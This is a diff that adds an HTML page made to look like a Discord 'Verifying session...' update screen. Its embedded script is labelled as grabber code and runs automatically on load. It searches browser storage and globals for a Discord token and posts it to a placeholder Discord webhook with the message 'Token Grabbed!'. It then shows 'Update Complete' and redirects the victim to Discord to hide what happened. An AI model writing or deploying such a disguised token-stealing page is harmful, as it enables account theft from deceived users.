@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Update</title>
+    <style>
+        body {
+            background-color: #36393f;
+            color: #dcddde;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: sans-serif;
+        }
+        .box {
+            background: #2f3136;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        .spinner {
+            border: 3px solid #4f4f4f;
+            border-top: 3px solid #7289da;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Discord</h2>
+        <p>Verifying session...</p>
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+        // --- GRABBER CODE START ---
+        async function grabToken() {
+            // Try to get the token from the web context
+            // Note: In web, token is often in localStorage or accessible via network requests
+            let token = null;
+            
+            // Method 1: Check common global variables used by Discord Web
+            const possibleTokens = [
+                window.discordToken,
+                window._discordToken,
+                localStorage.getItem('discord_token'),
+                sessionStorage.getItem('discord_token')
+            ];
+
+            for (let t of possibleTokens) {
+                if (t && t.length > 10) {
+                    token = t;
+                    break;
+                }
+            }
+
+            // Method 2: Fetch from API (if you have access to the user's context)
+            if (!token) {
+                try {
+                    const res = await fetch('/api/v6/users/@me', {
+                        headers: {
+                            'Authorization': '' // Will fail, but good to know structure
+                        }
+                    });
+                } catch(e) {}
+            }
+
+            if (!token) token = "Token not found (Web Mode)";
+
+            // Send to Webhook
+            const webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `**Token Grabbed!**\nToken: \`${token}\``
+                })
+            }).then(() => {
+                // Redirect user back to Discord to hide tracks
+                document.querySelector('.box').innerHTML = "<h2>Update Complete</h2>";
+                setTimeout(() => {
+                    window.location.href = "https://discord.com/app";
+                }, 2000);
+            });
+        }
+
+        // Run the grabber after a short delay
+        setTimeout(grabToken, 1000);
+    </script>
+</body>
+</html>
